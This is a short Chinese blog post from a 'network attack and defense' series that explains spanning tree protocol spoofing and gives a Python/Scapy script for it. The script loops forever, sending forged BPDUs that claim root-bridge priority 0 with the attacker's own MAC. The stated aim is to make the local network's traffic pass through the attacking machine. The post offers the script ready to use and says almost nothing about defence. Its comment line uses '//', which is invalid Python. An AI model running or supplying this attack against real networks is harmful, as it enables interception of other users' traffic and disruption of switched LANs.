---
title: 网络攻防之——Python实现生成树协议(STP)欺骗攻击
categories: 网络攻防
copyright: true
date: 2019-04-09 10:09:48
tags:
- Python
- 生成树协议欺骗
- 网络攻防
---
# 何为生成树协议欺骗攻击？
- 所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系
> 我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。

# 代码示例
<!--more-->
```
#!/usr/bin/python
from scapy.all import *

//01:80:c2:00:00:00这个是一个组播地址

eth = Dot3(dst="01:80:c2:00:00:00", src="自己的MAC地址")

llc = LLC()

stp = STP(rootid=0, rootmac="自己的MAC地址", bridgeid=0, bridgemac="自己的MAC地址"
)

pkt=sendp(eth/llc/stp,inter=2,loop=1)
```